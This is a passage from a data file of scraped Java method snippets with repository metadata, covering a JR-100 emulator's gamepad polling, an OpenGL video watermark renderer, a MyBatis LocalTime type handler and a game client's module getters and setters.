"https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getPropertyOfGamepadButtonMapping", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ComponentStatus", "snippet": "    public static ComponentStatus[] getPropertyOfGamepadButtonMapping() {        String m = Application.getProperties().getProperty(PROPERTY_GAMEPAD_BUTTON_MAPPING);        ComponentStatus[] mapping = new ComponentStatus[GAMEPAD_MAX_NUMBER_OF_BUTTONS];        if (m == null) {            for (int i = 0; i < mapping.length; i++) {                mapping[i] = new ComponentStatus(i, KeyEvent.VK_UNDEFINED);            }        }        else {            String[] splitted = m.split(\"\\\\s+\", 0);            for (int i = 0; i < Math.min(mapping.length, splitted.length); i++) {                mapping[i] = new ComponentStatus(i, Integer.parseInt(splitted[i]));            }            for (int i =Math.min(mapping.length, splitted.length); i < GAMEPAD_NUMBER_OF_DIRECTIONS; i++) {                mapping[i] = new ComponentStatus(i, -1);            }        }        return mapping;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "loop", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean loop() {        // System.out.println(\"gpm loop start\");        while (!suspendRequested) {            if (!controller.poll()) {                // System.out.println(\"gpm polling failed and break\");                return false;            }            EventQueue queue = controller.getEventQueue();            Event event = new Event();            while (queue.getNextEvent(event)) {                Component c = event.getComponent();                Identifier id = c.getIdentifier();                float v = c.getPollData();                // System.out.println(\"selected axis = \" + selectedAxisType + \"   \" + id.toString() + \" \" + v);                if ((selectedAxisType == AXIS_XY && c.getIdentifier() == Component.Identifier.Axis.X) ||                    (selectedAxisType == AXIS_RXRY && c.getIdentifier() == Component.Identifier.Axis.RX) ||                    (selectedAxisType == AXIS_ZRZ && c.getIdentifier() == Component.Identifier.Axis.Z)) {                    if (v < -THRESHOLD) {                        gamepadDirectionChanged(currentState, ACT_LEFT);                    }                    else if (v > THRESHOLD) {                        gamepadDirectionChanged(currentState, ACT_RIGHT);                    }                    else {                        gamepadDirectionChanged(currentState, ACT_X_NEUTRAL);                    }                }                else if ((selectedAxisType == AXIS_XY && c.getIdentifier() == Component.Identifier.Axis.Y) ||                        (selectedAxisType == AXIS_RXRY && c.getIdentifier() == Component.Identifier.Axis.RY) ||                        (selectedAxisType == AXIS_ZRZ && c.getIdentifier() == Component.Identifier.Axis.RZ)) {                    if (v < -THRESHOLD) {                        gamepadDirectionChanged(currentState, ACT_UP);                    }                    else if (v > THRESHOLD) {                        gamepadDirectionChanged(currentState, ACT_DOWN);                    }                    else {                        gamepadDirectionChanged(currentState, ACT_Y_NEUTRAL);                    }                }                else if (selectedAxisType == AXIS_POV) {                    if (v < 0.0625) {                        gamepadDirectionChanged(currentState, ACT_ORIGIN);                    }                    else if (v < 0.1875) {                        gamepadDirectionChanged(currentState, ACT_UP_LEFT);                    }                    else if (v < 0.3125) {                        gamepadDirectionChanged(currentState, ACT_UP);                    }                    else if (v < 0.4375) {                        gamepadDirectionChanged(currentState, ACT_UP_RIGHT);                    }                    else if (v < 0.5625) {                        gamepadDirectionChanged(currentState, ACT_RIGHT);                    }                    else if (v < 0.6875) {                        gamepadDirectionChanged(currentState, ACT_DOWN_RIGHT);                    }                    else if (v < 0.8125) {                        gamepadDirectionChanged(currentState, ACT_DOWN);                    }                    else if (v < 0.9375) {                        gamepadDirectionChanged(currentState, ACT_DOWN_LEFT);                    }                    else {                        gamepadDirectionChanged(currentState, ACT_LEFT);                    }                }                else if (id instanceof Component.Identifier.Button) {                    if (v > THRESHOLD) {                        gamepadButtonPressed(buttonNumber.get(id));                    }                    else {                        gamepadButtonReleased(buttonNumber.get(id));                    }                }            }            try {                Thread.sleep(25);            }            catch (InterruptedException e) {                break;            }        }        // System.out.println(\"loop end\");        suspendRequested = false;        return true;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "requestSuspend", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void requestSuspend() {        suspendRequested = true;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "waitForSuspended", "params": ["long", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean waitForSuspended(long period, int count) {        if (status == STATUS_RUNNING) {            // System.out.println(\"status is RUNNING\");            while (suspendRequested && count >= 0) {                try {                    Thread.sleep(100);                }                catch (InterruptedException e) {                }                count--;            }            return !suspendRequested;        }        else if (status == STATUS_STOPPED) {            // System.out.println(\"status is STOPPED\");            return false;        }        else {            // System.out.println(\"status is SUSPENDED\");            return true;        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "restart", "params": ["Controller"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean restart(Controller controller) {        // System.out.println(\"gpm requested restart\");        if (status == STATUS_STOPPED) {            return false;        }        // System.out.println(\"request gpm to suspend\");        if (status == STATUS_RUNNING) {            requestSuspend();            if (!waitForSuspended(100, 100)) {                // \u30bf\u30a4\u30e0\u30a2\u30a6\u30c8                // System.out.println(\"request timeout...\");                return false;            }        }        // System.out.println(\"gpm has been suspended\");        setController(controller);        // axisMapping = getPropertyOfGamepadAxisMapping();        synchronized(this) {            // System.out.println(\"notify to gpm\");            notify();        }        return true;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "scanControllers", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Controller>", "snippet": "    public ArrayList<Controller> scanControllers() {        Controller[] candidates = ControllerEnvironment.getDefaultEnvironment().getControllers();        ArrayList<Controller> found = new ArrayList<>();        for(int i = 0; i < candidates.length; i++){            Controller controller = candidates[i];            if (controller.getType() == Controller.Type.STICK                    || controller.getType() == Controller.Type.GAMEPAD) {                found.add(controller);            }        }        return found;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "searchForController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Controller", "snippet": "    public Controller searchForController() {        ArrayList<Controller> controllers = scanControllers();        controller = null;        for (Controller c : controllers) {            if (c.getName().equals(getPropertyOfGamepadName())) {                controller = c;            }        }        return controller;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {        try {            synchronized(this) {                while (true) {                    while (!getPropertyOfGamepadUse() || controller == null) {                        status = STATUS_SUSPENDED;                        try {                            wait();                        }                        catch (InterruptedException e) {                        }                    }                    status = STATUS_RUNNING;                    if (loop()) {                        status = STATUS_SUSPENDED;                        try {                            wait();                        }                        catch (InterruptedException e) {                        }                    }                    else {                        status = STATUS_SUSPENDED;                    }                }            }        }        catch (Throwable e) {            Application.getLogger().log(Level.SEVERE, \"\u5b9f\u884c\u6642\u30a8\u30e9\u30fc\", e);            return ;        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "gamepadDirectionChanged", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void gamepadDirectionChanged(int state, int action) {        if (axisKeyProcessor != null) {            axisKeyProcessor.execute(state, action);            currentState = stateTransitionTable[state][action];            if (currentState == DIR_ERROR) {                // \u30a2\u30ca\u30ed\u30b0\u30b9\u30c6\u30a3\u30c3\u30af\u306e\u5834\u5408\u3001\u95be\u5024\u3092\u8d85\u3048\u306a\u3044\u30a4\u30d9\u30f3\u30c8\u304c\u767a\u751f\u3059\u308b\u5834\u5408\u304c\u3042\u308b\u3002                // \u3053\u306e\u5834\u5408\u306f\u72b6\u614b\u9077\u79fb\u3055\u305b\u306a\u3044\u3002                currentState = state;            }            /*            {                if (state != s || action != a) {                    System.out.println(\"gamepadDirectionChanged(\" + state + \", \" + action + \") -> \" + currentState);                    s = state;                    a = action;                }            }            */        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "gamepadButtonPressed", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void gamepadButtonPressed(int number) {        if (buttonKeyProcessor != null) {            buttonKeyProcessor.execute(BUTTON_RELEASED, number);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "gamepadButtonReleased", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void gamepadButtonReleased(int number) {        if (buttonKeyProcessor != null) {            buttonKeyProcessor.execute(BUTTON_PRESSED, number);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "reset", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reset() {    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "execute", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute() {    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getLocalizedMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLocalizedMessage() {        return parsingErrror;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/subs/FatalParsingException.java", "stars": "4", "class": {"name": "FatalParsingException", "extends": "Exception", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {        mTriangleVertices = ByteBuffer                .allocateDirect(                        mTriangleVerticesData.length * FLOAT_SIZE_BYTES)                .order(ByteOrder.nativeOrder()).asFloatBuffer();        mTriangleVertices.put(mTriangleVerticesData).position(0);        Matrix.setIdentityM(mSTMatrix, 0);        Matrix.setIdentityM(mMVPMatrix, 0);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/GSYVideoGLViewCustomRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewCustomRender", "extends": "GSYVideoGLViewSimpleRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDrawFrame", "params": ["GL10"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDrawFrame(GL10 glUnused) {        super.onDrawFrame(glUnused);        //curProgram = createProgram(getVertexShader(), mBitmapEffect.getShader(mSurfaceView));        GLES20.glUseProgram(curProgram);        checkGlError(\"glUseProgram\");        //\u7ed1\u5b9a\u6ce8\u5165bitmap        int mFilterInputTextureUniform2 = GLES20.glGetUniformLocation(curProgram, \"sTexture2\");        GLES20.glActiveTexture(GLES20.GL_TEXTURE3);        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, mTexturesBitmap[0]);        GLES20.glUniform1i(mFilterInputTextureUniform2, mTexturesBitmap[0]);        mTriangleVertices.position(TRIANGLE_VERTICES_DATA_POS_OFFSET);        GLES20.glVertexAttribPointer(maPositionHandle, 3, GLES20.GL_FLOAT,                false, TRIANGLE_VERTICES_DATA_STRIDE_BYTES,                mTriangleVertices);        checkGlError(\"glVertexAttribPointer maPosition\");        GLES20.glEnableVertexAttribArray(maPositionHandle);        checkGlError(\"glEnableVertexAttribArray maPositionHandle\");        mTriangleVertices.position(TRIANGLE_VERTICES_DATA_UV_OFFSET);        GLES20.glVertexAttribPointer(maTextureHandle, 3, GLES20.GL_FLOAT,                false, TRIANGLE_VERTICES_DATA_STRIDE_BYTES,                mTriangleVertices);        checkGlError(\"glVertexAttribPointer maTextureHandle\");        GLES20.glEnableVertexAttribArray(maTextureHandle);        checkGlError(\"glEnableVertexAttribArray maTextureHandle\");        GLES20.glUniformMatrix4fv(muSTMatrixHandle, 1, false, mSTMatrix, 0);        GLES20.glUniformMatrix4fv(muMVPMatrixHandle, 1, false, mMVPMatrix, 0);        //\u6c34\u5370\u900f\u660e        GLES20.glEnable(GLES20.GL_BLEND);        GLES20.glBlendFunc(GLES20.GL_SRC_ALPHA, GLES20.GL_ONE_MINUS_SRC_ALPHA);        GLES20.glDrawArrays(GLES20.GL_TRIANGLE_STRIP, 0, 4);        checkGlError(\"glDrawArrays\");        GLES20.glFinish();        GLES20.glDisable(GLES20.GL_BLEND);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/GSYVideoGLViewCustomRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewCustomRender", "extends": "GSYVideoGLViewSimpleRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "onSurfaceChanged", "params": ["GL10", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceChanged(GL10 glUnused, int width, int height) {        super.onSurfaceChanged(glUnused, width, height);        //\u65cb\u8f6c\u5230\u6b63\u5e38\u89d2\u5ea6        Matrix.setRotateM(mMVPMatrix, 0, 180f, 0.0f, 0, 1.0f);        //\u8c03\u6574\u5927\u5c0f\u6bd4\u4f8b        Matrix.scaleM(mMVPMatrix, 0, mBitmapEffect.getScaleW(), mBitmapEffect.getScaleH(), 1);        //\u8c03\u6574\u4f4d\u7f6e        Matrix.translateM(mMVPMatrix, 0, mBitmapEffect.getPositionX(), mBitmapEffect.getPositionY(), 0f);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/GSYVideoGLViewCustomRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewCustomRender", "extends": "GSYVideoGLViewSimpleRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "onSurfaceCreated", "params": ["GL10", "EGLConfig"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceCreated(GL10 glUnused, EGLConfig config) {        super.onSurfaceCreated(glUnused, config);        curProgram = createProgram(getVertexShader(), mBitmapEffect.getShader(mSurfaceView));        if (curProgram == 0) {            return;        }        maPositionHandle = GLES20                .glGetAttribLocation(curProgram, \"aPosition\");        checkGlError(\"glGetAttribLocation aPosition\");        if (maPositionHandle == -1) {            throw new RuntimeException(                    \"Could not get attrib location for aPosition\");        }        maTextureHandle = GLES20.glGetAttribLocation(curProgram,                \"aTextureCoord\");        checkGlError(\"glGetAttribLocation aTextureCoord\");        if (maTextureHandle == -1) {            throw new RuntimeException(                    \"Could not get attrib location for aTextureCoord\");        }        muMVPMatrixHandle = GLES20.glGetUniformLocation(curProgram,                \"uMVPMatrix\");        checkGlError(\"glGetUniformLocation uMVPMatrix\");        if (muMVPMatrixHandle == -1) {            throw new RuntimeException(                    \"Could not get attrib location for uMVPMatrix\");        }        muSTMatrixHandle = GLES20.glGetUniformLocation(curProgram,                \"uSTMatrix\");        checkGlError(\"glGetUniformLocation uSTMatrix\");        if (muSTMatrixHandle == -1) {            throw new RuntimeException(                    \"Could not get attrib location for uSTMatrix\");        }        //\u521b\u5efabitmap        GLES20.glGenTextures(1, mTexturesBitmap, 0);        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, mTexturesBitmap[0]);        GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D,                GLES20.GL_TEXTURE_MAG_FILTER, GLES20.GL_NEAREST);        GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D,                GLES20.GL_TEXTURE_MIN_FILTER, GLES20.GL_NEAREST);        GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D,                GLES20.GL_TEXTURE_WRAP_S, GLES20.GL_CLAMP_TO_EDGE);        GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D,                GLES20.GL_TEXTURE_WRAP_T, GLES20.GL_CLAMP_TO_EDGE);        GLUtils.texImage2D(GLES20.GL_TEXTURE_2D, 0, mBitmapEffect.getBitmap(), 0);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/GSYVideoGLViewCustomRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewCustomRender", "extends": "GSYVideoGLViewSimpleRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "releaseAll", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseAll() {        super.releaseAll();        Bitmap bitmap = mBitmapEffect.getBitmap();        if (bitmap != null && !bitmap.isRecycled()) {            bitmap.recycle();        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/GSYVideoGLViewCustomRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewCustomRender", "extends": "GSYVideoGLViewSimpleRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentMVPMatrix", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float[] getCurrentMVPMatrix() {        return mMVPMatrix;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/GSYVideoGLViewCustomRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewCustomRender", "extends": "GSYVideoGLViewSimpleRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "setCurrentMVPMatrix", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentMVPMatrix(float[] mMVPMatrix) {        this.mMVPMatrix = mMVPMatrix;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/GSYVideoGLViewCustomRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewCustomRender", "extends": "GSYVideoGLViewSimpleRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "setBitmapEffect", "params": ["BitmapIconEffect"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBitmapEffect(BitmapIconEffect bitmapEffect) {        this.mBitmapEffect = bitmapEffect;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/GSYVideoGLViewCustomRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewCustomRender", "extends": "GSYVideoGLViewSimpleRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "setNonNullParameter", "params": ["PreparedStatement", "int", "LocalTime", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, LocalTime parameter, JdbcType jdbcType)          throws SQLException {    ps.setObject(i, parameter);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalTimeTypeHandler.java", "stars": "15", "class": {"name": "LocalTimeTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "LocalTime", "snippet": "  public LocalTime getNullableResult(ResultSet rs, String columnName) throws SQLException {    return rs.getObject(columnName, LocalTime.class);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalTimeTypeHandler.java", "stars": "15", "class": {"name": "LocalTimeTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "LocalTime", "snippet": "  public LocalTime getNullableResult(ResultSet rs, int columnIndex) throws SQLException {    return rs.getObject(columnIndex, LocalTime.class);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalTimeTypeHandler.java", "stars": "15", "class": {"name": "LocalTimeTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "LocalTime", "snippet": "  public LocalTime getNullableResult(CallableStatement cs, int columnIndex) throws SQLException {    return cs.getObject(columnIndex, LocalTime.class);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalTimeTypeHandler.java", "stars": "15", "class": {"name": "LocalTimeTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {        Mercury.INSTANCE.getPropertyManager().scan(this);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "find", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "AbstractProperty", "snippet": "    public AbstractProperty find(String term) {        for (AbstractProperty property : properties) {            if (property.getLabel().equalsIgnoreCase(term)) {                return property;            }        }        return null;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCategory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Category", "snippet": "    public Category getCategory() {        return category;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<AbstractProperty>", "snippet": "    public List<AbstractProperty> getProperties() {        return this.properties;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAlias", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String[] getAlias() {        return this.alias;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLabel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLabel() {        return this.label;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFakeLabel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFakeLabel() {        return this.fakelabel;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFakeLabel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFakeLabel(String fakelabel) {        this.fakelabel = fakelabel;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSuffix", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSuffix(String suffix) {        this.suffix = suffix;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSuffix", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSuffix() {        return  this.suffix;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDescription", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {        return this.description;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBind", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getBind() {        return this.bind;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBind", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBind(int bind) {        this.bind = bind;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isEnabled", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEnabled() {        return this.enabled;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isPersistent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPersistent() {        return this.persistent;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEnabled", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEnabled(boolean enabled) {        this.enabled = enabled;        if (enabled) {            Mercury.INSTANCE.getEventManager().registerListener(this);            onEnable();            onToggle();        } else {            Mercury.INSTANCE.getEventManager().deregisterListener(this);            onDisable();            onToggle();        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isHidden", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isHidden() {        return this.hidden;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setHidden", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHidden(boolean hidden) {        this.hidden = hidden;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onEnable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEnable() {    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onDisable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void 